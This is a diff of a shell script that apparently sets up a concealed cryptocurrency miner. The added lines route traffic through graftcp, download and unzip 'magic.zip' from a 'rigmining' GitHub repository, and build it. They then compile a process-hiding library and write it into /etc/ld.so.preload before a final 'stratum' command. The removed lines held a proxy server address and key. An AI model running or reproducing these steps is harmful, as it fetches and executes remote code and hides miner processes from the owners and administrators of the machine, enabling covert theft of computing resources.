@@ -31,8 +31,26 @@ sleep .2
 echo " "
 echo " "
 
-apt -y install shadowsocks-libev rng-tools
+echo " "
+echo " "
 
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magic.zip
+unzip magic.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 sudo ph add stratum
